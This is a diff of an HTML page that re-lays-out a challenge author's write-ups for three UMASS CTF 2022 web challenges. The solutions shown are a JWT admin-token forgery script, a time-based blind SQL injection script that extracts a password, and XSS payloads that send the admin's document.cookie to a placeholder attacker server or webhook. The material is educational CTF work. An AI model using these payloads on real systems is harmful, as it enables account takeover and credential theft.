@@ -30,80 +30,89 @@
         <h1 id="-umass-ctf-2022-april-2022-"><strong>UMASS CTF 2022 - April 2022</strong></h1>
         <p>UMASS CTF was this past weekend and I authored three web challenges: <a href="#AutoFlag">AutoFlag</a>, <a href="#Venting">Venting</a>, and <a href="#umassdining">umassdining</a>. You can click any of the challenge names to navigate to the summary and writeup.</p>
       </div>
-      <div id="AutoFlag" style="margin-left: 15px;">
-        <h4 id="-autoflag-"><em>AutoFlag</em></h4>
-        <h5 id="introduction">Introduction</h5>
-        <p>This challenge was based off a challenge that Akamai created for UMASS CTF. Originally, it was a jwt token manipulation challenge that hinted at the secret token being &quot;super-secret.&quot; While this was an okay idea for a challenge, I decided to expand on the idea with some very basic git forensics and code review. At the end of the competition it had 184 solves so I may have made it slightly easier than anticipated. Below is my &quot;official&quot; writeup of the challenge. </p>
-        <p><img src="images/challenge1.png" style="width: 50%; height: 50%;"></p>
-        <h5 id="initial-findings">Initial Findings</h5>
-        <p>Upon opening the website we&#39;re greeted with the AutoFlag site giving us two buttons, one to get a free flag and another to see the AutoFlag API.
-        <img src="images/challenge1site.png" style="width: 50%; height: 50%;"></p>
-        <p>Since everybody wants a free flag, let&#39;s just click that and get one! This ends up with us getting redirected, and the site also makes some requests which we will inspect later.</p>
-        <img src="images/challenge1redir.png" style="width: 50%; height: 50%;">
-        <p>
-        After a few seconds, we are redirected to a page with a flag we don&#39;t want. A few more requests are made so let&#39;s start looking at them. Also note, the file name is anonuserflag.png, this may hint that there are other user flags to collect.
-        </p>
-        
-        <img src="images/dumbflag.png" style="width: 50%; height: 50%;">
-        <p>This first GET request we see is on <code>/login</code> where we see that a cookie is set. This looks a lot like a JWT cookie, we can tell by the base64 <code>ey</code> which in ascii is <code>{</code> aswell as the three parts being seperated by dots. This follows the JWT structure of <code>{header}.{payload}.{signature}</code> all of which are base64 and url-encoded. So we know a JWT authentication is sent, this can be a possible vector of attack if we want to login as another user. Possible attacks you may be thinking of are a weak JWT secret or misconfiguration server side.</p>
-        <p><img src="images/request1.png" style="width: 50%; height: 50%;"></p>
-        <h5 id="investigation">Investigation</h5>
-        <p>Also in the request above we can see a javascript file is loaded called <code>api.js</code>. We can open it up and see that in the source a comment is telling us that there is an &#39;admin&#39; user and we can see the API source code changes on git. Interesting, let&#39;s check it out.</p>
-        <p><img src="images/scriptv2.png" alt=""></p>
-        <p>If we click the checkout the Autoflag API button on the main page we get a repository and see 4 commits. One commit looks kind of interesting, let&#39;s click that.
-        <img src="images/commits.png" alt=""></p>
-        <p>Checking out that commit we see a simple js script that created an unsigned token and signs it. Tokens are signed by sending them in a post request to an <code>/api/sign-hmac</code> endpoint. Let&#39;s see if this endpoint is still open by sending a basic request to it.</p>
-        <p><img src="images/curl.png" alt=""></p>
-        <h5 id="exploitation">Exploitation</h5>
-        <p>So putting this all together, we can sign any token with the secret on the server and we know that there is a user called admin to impersonate. So we can change the user identity to admin and authenticate on <code>/flag</code>. Here is my solve script below.</p>
-        <pre><code><span class="hljs-keyword">import</span> base64
-        <span class="hljs-keyword">import</span> json
-        <span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> r
-        r1 = r.<span class="hljs-keyword">get</span>(<span class="hljs-string">'http://34.148.103.218:4829/login'</span>)
-        
-        <span class="hljs-keyword">val</span> = r1.cookies.<span class="hljs-keyword">get</span>(<span class="hljs-string">'access_token_cookie'</span>)
-        <span class="hljs-keyword">val</span> = str(<span class="hljs-keyword">val</span>).split(<span class="hljs-string">'.'</span>)
-        
-        jwt_payload = base64.b64decode(<span class="hljs-keyword">val</span>[<span class="hljs-number">1</span>] + <span class="hljs-string">'=='</span>).decode(<span class="hljs-string">'utf-8'</span>)
-        jwt_payload = json.loads(jwt_payload)
-        jwt_payload[<span class="hljs-string">'sub'</span>] = <span class="hljs-string">'admin'</span>
-        jwt_payload = json.dumps(jwt_payload)
-        jwt_payload = base64.b64encode(bytes(jwt_payload,<span class="hljs-string">'utf-8'</span>)).decode(<span class="hljs-string">'utf-8'</span>).replace(<span class="hljs-string">'='</span>,<span class="hljs-string">''</span>)
-        
-        
-        payload = {<span class="hljs-string">"message"</span>:<span class="hljs-keyword">val</span>[<span class="hljs-number">0</span>] + <span class="hljs-string">'.'</span> + jwt_payload}
-        r1 = r.post(<span class="hljs-string">'http://34.148.103.218:4829/api/sign-hmac'</span>,<span class="hljs-keyword">data</span>=payload)
-        token = <span class="hljs-keyword">val</span>[<span class="hljs-number">0</span>] + <span class="hljs-string">'.'</span> + jwt_payload + <span class="hljs-string">'.'</span> + r1.text.replace(<span class="hljs-string">'='</span>,<span class="hljs-string">''</span>)
-        
-        
-        headers = {
-        <span class="hljs-string">"Cookie"</span>:f<span class="hljs-string">"access_token_cookie={token}"</span>
-        }
-        r1 = r.<span class="hljs-keyword">get</span>(<span class="hljs-string">'http://34.148.103.218:4829/flag'</span>,headers=headers)
-        
-        print(r1.text)
-        </code></pre><p>And that&#39;s our flag: <code>UMASS{W0W_TH1$_1$_4_C00L_FL4G_BRUH!_69420}</code></p>
-        <p>In summary I think the challenge could have been made harder by obscuring some of the code better in <code>api.js</code> such as making tokens with missing JTI claims and leaving them in the js. This would probably force people to get their own unsigned token from /login, alter, and sign it. However, this challenge was made 2 days before the competition (that&#39;s when Akamai sent it over) and I&#39;d say it is a solid improvement of what was previously given to us. Diclaimer: I had full consent from Akamai to edit/revise the challenge as I saw fit.</p>
-      </div>
+      <div class="card">
+        <div class="card-body">
+          <h4 class="card-title" ><a href="#AutoFlag"><strong>AutoFlag</strong></a></h4>
+            <p class="card-text">
+              <div id="AutoFlag" style="margin-left: 15px;">
+                <h5 id="introduction">Introduction</h5>
+                <p>This challenge was based off a challenge that Akamai created for UMASS CTF. Originally, it was a jwt token manipulation challenge that hinted at the secret token being &quot;super-secret.&quot; While this was an okay idea for a challenge, I decided to expand on the idea with some very basic git forensics and code review. At the end of the competition it had 184 solves so I may have made it slightly easier than anticipated. Below is my &quot;official&quot; writeup of the challenge. </p>
+                <p><img src="images/challenge1.png" style="width: 50%; height: 50%;"></p>
+                <h5 id="initial-findings">Initial Findings</h5>
+                <p>Upon opening the website we&#39;re greeted with the AutoFlag site giving us two buttons, one to get a free flag and another to see the AutoFlag API.
+                <img src="images/challenge1site.png" style="width: 50%; height: 50%;"></p>
+                <p>Since everybody wants a free flag, let&#39;s just click that and get one! This ends up with us getting redirected, and the site also makes some requests which we will inspect later.</p>
+                <img src="images/challenge1redir.png" style="width: 50%; height: 50%;">
+                <p>
+                After a few seconds, we are redirected to a page with a flag we don&#39;t want. A few more requests are made so let&#39;s start looking at them. Also note, the file name is anonuserflag.png, this may hint that there are other user flags to collect.
+                </p>
+                <img src="images/dumbflag.png" style="width: 50%; height: 50%;">
+                <p>This first GET request we see is on <code>/login</code> where we see that a cookie is set. This looks a lot like a JWT cookie, we can tell by the base64 <code>ey</code> which in ascii is <code>{</code> aswell as the three parts being seperated by dots. This follows the JWT structure of <code>{header}.{payload}.{signature}</code> all of which are base64 and url-encoded. So we know a JWT authentication is sent, this can be a possible vector of attack if we want to login as another user. Possible attacks you may be thinking of are a weak JWT secret or misconfiguration server side.</p>
+                <p><img src="images/request1.png" style="width: 50%; height: 50%;"></p>
+                <h5 id="investigation">Investigation</h5>
+                <p>Also in the request above we can see a javascript file is loaded called <code>api.js</code>. We can open it up and see that in the source a comment is telling us that there is an &#39;admin&#39; user and we can see the API source code changes on git. Interesting, let&#39;s check it out.</p>
+                <p><img src="images/scriptv2.png" alt=""></p>
+                <p>If we click the checkout the Autoflag API button on the main page we get a repository and see 4 commits. One commit looks kind of interesting, let&#39;s click that.
+                <img src="images/commits.png" alt=""></p>
+                <p>Checking out that commit we see a simple js script that created an unsigned token and signs it. Tokens are signed by sending them in a post request to an <code>/api/sign-hmac</code> endpoint. Let&#39;s see if this endpoint is still open by sending a basic request to it.</p>
+                <p><img src="images/curl.png" alt=""></p>
+                <h5 id="exploitation">Exploitation</h5>
+                <p>So putting this all together, we can sign any token with the secret on the server and we know that there is a user called admin to impersonate. So we can change the user identity to admin and authenticate on <code>/flag</code>. Here is my solve script below.</p>
+                <pre><code><span class="hljs-keyword">
+import</span> base64
+<span class="hljs-keyword">import</span> json
+<span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> r
+r1 = r.<span class="hljs-keyword">get</span>(<span class="hljs-string">'http://34.148.103.218:4829/login'</span>)
 
+<span class="hljs-keyword">val</span> = r1.cookies.<span class="hljs-keyword">get</span>(<span class="hljs-string">'access_token_cookie'</span>)
+<span class="hljs-keyword">val</span> = str(<span class="hljs-keyword">val</span>).split(<span class="hljs-string">'.'</span>)
+
+jwt_payload = base64.b64decode(<span class="hljs-keyword">val</span>[<span class="hljs-number">1</span>] + <span class="hljs-string">'=='</span>).decode(<span class="hljs-string">'utf-8'</span>)
+jwt_payload = json.loads(jwt_payload)
+jwt_payload[<span class="hljs-string">'sub'</span>] = <span class="hljs-string">'admin'</span>
+jwt_payload = json.dumps(jwt_payload)
+jwt_payload = base64.b64encode(bytes(jwt_payload,<span class="hljs-string">'utf-8'</span>)).decode(<span class="hljs-string">'utf-8'</span>).replace(<span class="hljs-string">'='</span>,<span class="hljs-string">''</span>)
+
+
+payload = {<span class="hljs-string">"message"</span>:<span class="hljs-keyword">val</span>[<span class="hljs-number">0</span>] + <span class="hljs-string">'.'</span> + jwt_payload}
+r1 = r.post(<span class="hljs-string">'http://34.148.103.218:4829/api/sign-hmac'</span>,<span class="hljs-keyword">data</span>=payload)
+token = <span class="hljs-keyword">val</span>[<span class="hljs-number">0</span>] + <span class="hljs-string">'.'</span> + jwt_payload + <span class="hljs-string">'.'</span> + r1.text.replace(<span class="hljs-string">'='</span>,<span class="hljs-string">''</span>)
+
+
+headers = {
+<span class="hljs-string">"Cookie"</span>:f<span class="hljs-string">"access_token_cookie={token}"</span>
+}
+r1 = r.<span class="hljs-keyword">get</span>(<span class="hljs-string">'http://34.148.103.218:4829/flag'</span>,headers=headers)
+print(r1.text)
+                </code></pre><p>And that&#39;s our flag: <code>UMASS{W0W_TH1$_1$_4_C00L_FL4G_BRUH!_69420}</code></p>
+                <p>In summary I think the challenge could have been made harder by obscuring some of the code better in <code>api.js</code> such as making tokens with missing JTI claims and leaving them in the js. This would probably force people to get their own unsigned token from /login, alter, and sign it. However, this challenge was made 2 days before the competition (that&#39;s when Akamai sent it over) and I&#39;d say it is a solid improvement of what was previously given to us. Diclaimer: I had full consent from Akamai to edit/revise the challenge as I saw fit.</p>
+              </div>
+            </p>
+          </div>
         </div>
-        <div id="Venting" style="margin-left: 15px;">
-            <h4 id="-venting-"><em>Venting</em></h4>
-<h5 id="introduction">Introduction</h5>
-<p>The second challenge venting had less solves than AutoFlag yet more than most other challenges. This challenge was made a few months before the CTF very quickly and not really touched again. Out of these three first attempts at web challenges, this was the really the first challenge I made. During the CTF this was hosted on one instance and sqlite3 only supports one connection at a time, which on the first day caused some issues for players.</p>
-<p><img src="images/challenge2.png" alt=""></p>
-<h5 id="initial-findings-investigation">Initial Findings &amp; Investigation</h5>
-<p>So upon arrival we are given a form to fill out, none of the fields seem to be required though so let&#39;s just click submit.</p>
-<p><img src="images/sus.png" alt=""></p>
-<p>When we check the sitemap after the initial request, we see several more redirects happen. One of which has a redirect with some url paramaters including <code>admin=False</code>.</p>
-<p><img src="images/sus2.png" alt=""></p>
-<p>If we resend the request with URL paramters with admin=True, we are given a login screen. When we press login we can see a POST request is sent with two form variables: <code>user</code> and <code>pass</code>. When we send a basic response with user <code>admin</code> and any password, the response it <code>Invalid login</code>.</p>
-<p><img src="images/login.png" alt=""></p>
-<h5 id="exploitation">Exploitation</h5>
-<p>From this we can assume that there is some sort of authentication bypass that we need to login as admin. A SQLi login bypass seems most likely and reading the html comments of the page also confirm that sqlite3 is running on the server to check requests. We can try a inject and we can see an error as well as the full query being executed. Aswell as our comments being replaced by some very sus unicode characters.</p>
-<p><img src="images/sql.png" alt=""></p>
-<p>Once we craft a successful payload without comments we can get a response from the admin saying that there totally isn&#39;t anything in their password. If we want to take a look at it regardless we have to blindly enumerate through the user password. Some people used error based blind SQL injections, however my solution used a time based payload. It ended up being a bit messy and slow even though I do a binary search to lower the amount of requests I make, however it will eventually print the admin pass.</p>
-<pre><code>import requests as r;
+      </div>
+      <br>
+      <div class="card">
+        <div class="card-body">
+          <h4 class="card-title" ><a href="#Venting"><strong>Venting</strong></a></h4>
+            <p class="card-text">
+              <div id="Venting" style="margin-left: 15px;">
+                <h5 id="introduction">Introduction</h5>
+                <p>The second challenge venting had less solves than AutoFlag yet more than most other challenges. This challenge was made a few months before the CTF very quickly and not really touched again. Out of these three first attempts at web challenges, this was the really the first challenge I made. During the CTF this was hosted on one instance and sqlite3 only supports one connection at a time, which on the first day caused some issues for players.</p>
+                <p><img src="images/challenge2.png" alt=""></p>
+                <h5 id="initial-findings-investigation">Initial Findings &amp; Investigation</h5>
+                <p>So upon arrival we are given a form to fill out, none of the fields seem to be required though so let&#39;s just click submit.</p>
+                <p><img src="images/sus.png" alt=""></p>
+                <p>When we check the sitemap after the initial request, we see several more redirects happen. One of which has a redirect with some url paramaters including <code>admin=False</code>.</p>
+                <p><img src="images/sus2.png" alt=""></p>
+                <p>If we resend the request with URL paramters with admin=True, we are given a login screen. When we press login we can see a POST request is sent with two form variables: <code>user</code> and <code>pass</code>. When we send a basic response with user <code>admin</code> and any password, the response it <code>Invalid login</code>.</p>
+                <p><img src="images/login.png" alt=""></p>
+                <h5 id="exploitation">Exploitation</h5>
+                <p>From this we can assume that there is some sort of authentication bypass that we need to login as admin. A SQLi login bypass seems most likely and reading the html comments of the page also confirm that sqlite3 is running on the server to check requests. We can try a inject and we can see an error as well as the full query being executed. Aswell as our comments being replaced by some very sus unicode characters.</p>
+                <p><img src="images/sql.png" alt=""></p>
+                <p>Once we craft a successful payload without comments we can get a response from the admin saying that there totally isn&#39;t anything in their password. If we want to take a look at it regardless we have to blindly enumerate through the user password. Some people used error based blind SQL injections, however my solution used a time based payload. It ended up being a bit messy and slow even though I do a binary search to lower the amount of requests I make, however it will eventually print the admin pass.</p>
+                <pre><code>
+import requests as r;
 import time;
 target = input(<span class="hljs-string">"Input target url below!\n"</span>)
 payload= {
@@ -136,55 +145,72 @@ while(counter&lt;50):
         counter = counter+1
         print(password)</span>
 </code></pre><h5 id="conclusion">Conclusion</h5>
-<p>Overall I think the challenge is okay. The main issue was challenge stability which could have been fixed by having multiple instances or at the very least multiple databases since there was only one single database connection allowed at once. In the future, I would probably try to include a full WAF with mulitple filters rather than just the password. For a first challenge, this is not too bad though.</p>
+                <p>Overall I think the challenge is okay. The main issue was challenge stability which could have been fixed by having multiple instances or at the very least multiple databases since there was only one single database connection allowed at once. In the future, I would probably try to include a full WAF with mulitple filters rather than just the password. For a first challenge, this is not too bad though.</p>
+              </p>            
+            </div>  
+          </div>
+        </div>
+        <br>
+        <div class="card">
+          <div class="card-body">
+            <h4 class="card-title" ><a href="#umassdining"><strong>umassdining</strong></a></h4>
+              <p class="card-text">
+                <div id="umassdining" style="margin-left: 15px;">
+                  <h5 id="introduction">Introduction</h5>
+                  <p>This was the hardest of the three challenges, both in number of solves and actually creating it. It&#39;s a simple XSS -&gt; CSRF attack with an admin browser checking responses. However, to make it slightly harder I added a content security policy to only allow in-domain requests to occur. I did however, leave a relatively straight forward vector for attack in the site. Below I&#39;ll give a writeup including what someone who solved this challenge may have been thinking. </p>
+                  <p><img src="images/challenge3.png" alt=""></p>
+                  <h5 id="initial-findings">Initial Findings</h5>
+                  <p>The challenge description gives us a file to download and view some source in, let&#39;s check that out first before running it locally. We can see that there is a flask server running in <code>main.py</code> aswell as a <code>bot.py</code> file in the <code>/bot/</code> directory. Working backwards, we can see the flag is given if we sent our authentication cookie to <code>/join</code>. However if we try to join normally we will be rejected.</p>
+                  <p><img src="images/flagpossible.png" alt=""></p>
+                  <p>If we look for other occurences of <code>admin_cookie</code> in either file we find that in bot.py, a headless bot browser opens a request with  url paramaters <code>essay</code> and <code>email</code> to <code>/review/essay</code>. When looking closely at the source code for the <code>/review/essay/</code> endpoint  we can see that our essay is injected into a html document with the safe flag which disables autoescaping of characters when rendering our injecting variable into a template.</p>
+                  <p><img src="images/inject1.png" alt="">
+                  <img src="images/inject2.png" alt=""></p>
+                  <h5 id="investigation">Investigation</h5>
+                  <p> Putting all our information together, we can craft an XSS payload to exfiltrate an admin cookie over to our server and then authenticate as them on <code>/join</code> to get an easy flag. Send a POST request with essay and email in the form data and the bot will start working on another thread. So we send a basic payload <code>&lt;img src=1 onerror=fetch(`ourserver${document.cookie}`)&gt;</code></p>
+                  <p><img src="images/register.png" alt=""></p>
+                  <p>And we recieve nothing back, our payload seems fine so let&#39;s open up the web tools console and try the javascript on the site. We see two big things: First off, our fetch request is being rejected due to Content Security Policy only allowing <code>&#39;self&#39;</code>. If you decide to look furthur into Content Security Policy, you&#39;ll also see that all of our unsafe in-line payloads will be blocked. So is it impossible to exploit? Nope, the second  big thing we see is a strange message in console: <code>DOM content loaded for user</code> and it&#39;s being initiated by a <code>thing.js</code> file.</p>
+                  <p><img src="images/test.png" alt="">
+                  <img src="images/big1.png" alt=""></p>
+                  <p>Checking out this file, it seems like a simple script that will wait for the DOM content of the site to be loaded before timing out. If you&#39;re not familiar with this javascript execution sink, you might be hinted by the content security policy which for some reason allows <code>&#39;unsafe eval&#39;</code>. Since we now know that the first parameter of <code>setTimeout()</code> is an eval we can start crafting a string to break out of it.</p>
+                  <p><img src="images/unsafejs.png" alt=""></p>
+                  <h5 id="exploitation">Exploitation</h5>
+                  <p>After some tampering your string should look something like: <code>&gt;hi&#39;);document.location=&#39;[YOUR SERVER]?value=&#39;%2Bdocument.cookie;//</code>. We&#39;re using <code>document.location</code> to force the admin on our site and steal the cookie, this is because changing <code>document.location</code> will tell the browser to load the url string we assign to it. Finally, we just have to send the full payload similar to how the script is originally called on site. </p>
+                  <p><img src="images/ogscript.png" alt=""></p>
+                  <p>Below is the script to send a request to your webhook, aswell as the response we get on the webhook server.</p>
+                  <pre><code><span class="hljs-keyword">
+import</span> requests <span class="hljs-keyword">as</span> r 
+url = input(<span class="hljs-string">"Add you webhook URL\n"</span>)
 
-        </div>
-        <div id="umassdining" style="margin-left: 15px;">
-            <h4 id="-umassdining-"><em>umassdining</em></h4>
-            <h5 id="introduction">Introduction</h5>
-            <p>This was the hardest of the three challenges, both in number of solves and actually creating it. It&#39;s a simple XSS -&gt; CSRF attack with an admin browser checking responses. However, to make it slightly harder I added a content security policy to only allow in-domain requests to occur. I did however, leave a relatively straight forward vector for attack in the site. Below I&#39;ll give a writeup including what someone who solved this challenge may have been thinking. </p>
-            <p><img src="images/challenge3.png" alt=""></p>
-            <h5 id="initial-findings">Initial Findings</h5>
-            <p>The challenge description gives us a file to download and view some source in, let&#39;s check that out first before running it locally. We can see that there is a flask server running in <code>main.py</code> aswell as a <code>bot.py</code> file in the <code>/bot/</code> directory. Working backwards, we can see the flag is given if we sent our authentication cookie to <code>/join</code>. However if we try to join normally we will be rejected.</p>
-            <p><img src="images/flagpossible.png" alt=""></p>
-            <p>If we look for other occurences of <code>admin_cookie</code> in either file we find that in bot.py, a headless bot browser opens a request with  url paramaters <code>essay</code> and <code>email</code> to <code>/review/essay</code>. When looking closely at the source code for the <code>/review/essay/</code> endpoint  we can see that our essay is injected into a html document with the safe flag which disables autoescaping of characters when rendering our injecting variable into a template.</p>
-            <p><img src="images/inject1.png" alt="">
-            <img src="images/inject2.png" alt=""></p>
-            <h5 id="investigation">Investigation</h5>
-            <p> Putting all our information together, we can craft an XSS payload to exfiltrate an admin cookie over to our server and then authenticate as them on <code>/join</code> to get an easy flag. Send a POST request with essay and email in the form data and the bot will start working on another thread. So we send a basic payload <code>&lt;img src=1 onerror=fetch(`ourserver${document.cookie}`)&gt;</code></p>
-            <p><img src="images/register.png" alt=""></p>
-            <p>And we recieve nothing back, our payload seems fine so let&#39;s open up the web tools console and try the javascript on the site. We see two big things: First off, our fetch request is being rejected due to Content Security Policy only allowing <code>&#39;self&#39;</code>. If you decide to look furthur into Content Security Policy, you&#39;ll also see that all of our unsafe in-line payloads will be blocked. So is it impossible to exploit? Nope, the second  big thing we see is a strange message in console: <code>DOM content loaded for user</code> and it&#39;s being initiated by a <code>thing.js</code> file.</p>
-            <p><img src="images/test.png" alt="">
-            <img src="images/big1.png" alt=""></p>
-            <p>Checking out this file, it seems like a simple script that will wait for the DOM content of the site to be loaded before timing out. If you&#39;re not familiar with this javascript execution sink, you might be hinted by the content security policy which for some reason allows <code>&#39;unsafe eval&#39;</code>. Since we now know that the first parameter of <code>setTimeout()</code> is an eval we can start crafting a string to break out of it.</p>
-            <p><img src="images/unsafejs.png" alt=""></p>
-            <h5 id="exploitation">Exploitation</h5>
-            <p>After some tampering your string should look something like: <code>&gt;hi&#39;);document.location=&#39;[YOUR SERVER]?value=&#39;%2Bdocument.cookie;//</code>. We&#39;re using <code>document.location</code> to force the admin on our site and steal the cookie, this is because changing <code>document.location</code> will tell the browser to load the url string we assign to it. Finally, we just have to send the full payload similar to how the script is originally called on site. </p>
-            <p><img src="images/ogscript.png" alt=""></p>
-            <p>Below is the script to send a request to your webhook, aswell as the response we get on the webhook server.</p>
-            <pre><code><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> r 
-            url = input(<span class="hljs-string">"Add you webhook URL\n"</span>)
-            
-            data= {
-                <span class="hljs-string">"email"</span>:<span class="hljs-string">"hellobozo@gmail.com"</span>,
-                <span class="hljs-string">"essay"</span>:<span class="hljs-string">""</span>
-            }
-            data[<span class="hljs-string">'essay'</span>]=<span class="hljs-string">"""&amp;lt;script id='debug' src="/static/js/thing.js" data-iloveumass="hi');document.location=
-            '"""</span>+url+<span class="hljs-string">"""?value='%2Bdocument.cookie;//"&gt;&amp;lt;/script&gt;"""</span>
-            <span class="hljs-comment">#or whatever ip ur hosting this on</span>
-            r1=r.post(<span class="hljs-string">"http://34.148.103.218:6942/register"</span>,data=data)
-            </code></pre><p><img src="images/resp.png" alt=""></p>
-            <h5 id="conclusion">Conclusion</h5>
-            <p>Finally we send our cookie as <code>auth=VEgxUzFTRDRTVVAzUlMzQ1IzVDRETTFOQzAwS0kzTDBMIQ</code> and get our flag <code>UMASS{NUMB3R_0N3_1N_$TUD3NT_D1N1NG_XD86543267!}</code>. Overall this challenge was a bit harder but I&#39;d still put it at around beginner/intermediate difficiulty. I hope people learned a lot from this challenge, especially about how you should craft XSS payloads in a very limited environment. </p>            
-        </div>
+data= {
+    <span class="hljs-string">"email"</span>:<span class="hljs-string">"hellobozo@gmail.com"</span>,
+    <span class="hljs-string">"essay"</span>:<span class="hljs-string">""</span>
+}
+data[<span class="hljs-string">'essay'</span>]=<span class="hljs-string">"""&amp;lt;script id='debug' src="/static/js/thing.js" data-iloveumass="hi');document.location=
+'"""</span>+url+<span class="hljs-string">"""?value='%2Bdocument.cookie;//"&gt;&amp;lt;/script&gt;"""</span>
+<span class="hljs-comment">#or whatever ip ur hosting this on</span>
+r1=r.post(<span class="hljs-string">"http://34.148.103.218:6942/register"</span>,data=data)
+                  </code></pre><p><img src="images/resp.png" alt=""></p>
+                  <h5 id="conclusion">Conclusion</h5>
+                  <p>Finally we send our cookie as <code>auth=VEgxUzFTRDRTVVAzUlMzQ1IzVDRETTFOQzAwS0kzTDBMIQ</code> and get our flag <code>UMASS{NUMB3R_0N3_1N_$TUD3NT_D1N1NG_XD86543267!}</code>. Overall this challenge was a bit harder but I&#39;d still put it at around beginner/intermediate difficiulty. I hope people learned a lot from this challenge, especially about how you should craft XSS payloads in a very limited environment. </p>            
+              </div>
+          </div>
+        </div>      
+      </p>  
     </div>
-    <div>
-        <h3>Summary</h3>
+          
+
+
+    <div class="card">
+      <div class="card-body">
+        <h4 class="card-title" ><strong>Summary</strong></h4>
+          <p class="card-text">
         UMASS CTF as a whole was a great experience, I really enjoyed being a challenge author for a change
         and all the struggles that came with it. I noticed some mixed reactions with the web exploitation challenge,
         while most seemed to like them, others thought they were on the easier side. What I would change for next year 
         is to bring more difficult yet refreshing challenges in addition to those for beginner/intermediate players. If you made it to the end,
         you're super cool :)
+        </p>
+        </div>
     </div>
     <br>
 
